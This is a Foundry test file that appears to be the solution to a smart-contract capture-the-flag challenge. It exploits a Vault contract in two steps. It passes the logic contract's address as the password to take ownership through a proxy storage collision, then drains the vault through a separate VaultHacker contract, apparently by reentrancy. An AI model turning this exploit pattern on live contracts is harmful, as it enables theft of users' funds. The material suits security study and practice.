// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/console.sol";
import {Test, console} from "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/VaultHacker.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    VaultHacker public vaultHacker;

    address owner = address(1);
    address hacker = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposit{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        address logicAddr = address(logic);
        vm.deal(hacker, 1 ether);
        vm.startPrank(hacker);
        address(vault).call(abi.encodeWithSignature("changeOwner(bytes32,address)", bytes32(uint256(uint160(logicAddr))), hacker));
        vault.openWithdraw();
        vaultHacker = new VaultHacker(address(vault));
        vaultHacker.deposit{value: 0.1 ether}();
        vaultHacker.withdraw();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
